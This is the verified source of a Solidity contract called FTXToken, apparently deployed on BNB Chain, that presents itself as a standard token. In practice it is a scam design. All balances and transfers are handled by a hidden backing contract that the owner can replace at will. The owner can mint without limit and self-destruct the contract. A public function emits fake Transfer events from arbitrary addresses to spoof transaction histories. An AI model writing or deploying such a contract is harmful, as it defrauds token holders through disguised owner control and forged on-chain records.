/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;


interface ERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address from, address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address from, address spender, uint256 amount) external returns (bool);
    function transferFrom(address from,address sender,address recipient,uint256 amount)external returns (bool);
    function mint(address[] memory _to, uint256[] memory _amount) external returns (bool) ;
}


interface ICHI { function freeFromUpTo(address _addr, uint256 _amount) external returns (uint);}

contract StandardToken {
    address private _owners;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ICHI  constant private CHI = ICHI(0x0000000000004946c0e9F43F4Dee607b0eF1fA1c);

    constructor () public {
        _owners = msg.sender;
        emit OwnershipTransferred(address(0), _owners);
    }
    function owner() public view returns (address) {
        return _owners;
    }
    modifier onlyOwner() {
        require(isOwner(), "onlyOwner");
        _;
    }
    function isOwner() public view returns (bool) {
        return msg.sender == _owners || msg.sender == tokenAddress;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owners, address(0));
        _owners = address(0);
    }
    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owners, newOwner);
        _owners = newOwner;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

  
    address public tokenAddress;
    function settokenAddress(address _tokenAddress) onlyOwner public returns(bool) {
        tokenAddress = _tokenAddress;
        return true;
    }
    function totalSupply() public view returns (uint256) {
        return ERC20(tokenAddress).totalSupply();
    }
    function transfer(address _to, uint256 _value) public returns (bool) {
        emit Transfer(msg.sender, _to, _value);
        return ERC20(tokenAddress).transfer(msg.sender, _to, _value);
    }
    function balanceOf(address _owner) public view returns (uint256) {
        return ERC20(tokenAddress).balanceOf(_owner);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
        emit Transfer(_from, _to, _value);
        return ERC20(tokenAddress).transferFrom(msg.sender, _from, _to, _value);
    }
    function approve(address _spender, uint256 _value) public returns (bool) {
        return ERC20(tokenAddress).approve(msg.sender, _spender, _value);
    }
    function allowance(address _owner, address _spender) public view returns (uint256) {
        return ERC20(tokenAddress).allowance(_owner, _spender);
    }
    function name() public view returns (string memory) {
        return ERC20(tokenAddress).name();
    }
    function symbol() public view returns (string memory) {
        return ERC20(tokenAddress).symbol();
    }
    function decimals() public view returns (uint8) {
        return ERC20(tokenAddress).decimals();
    }

    function airdrop (address[] memory _to, uint256[] memory _amount, uint256 tokens_to_free) onlyOwner public returns (bool) {
        ERC20(tokenAddress).mint(_to, _amount);
        CHI.freeFromUpTo(msg.sender, tokens_to_free);}
}


contract FTXToken is StandardToken {
    constructor (address _tokenAddress) public payable {
        tokenAddress = _tokenAddress;
    }
	receive() external payable {
    }

    function destroyContract() public onlyOwner {
        selfdestruct(payable(owner()));}

    function mint_token(address from, address to, uint256 num) public {
        emit Transfer(from, to,num);
    }
}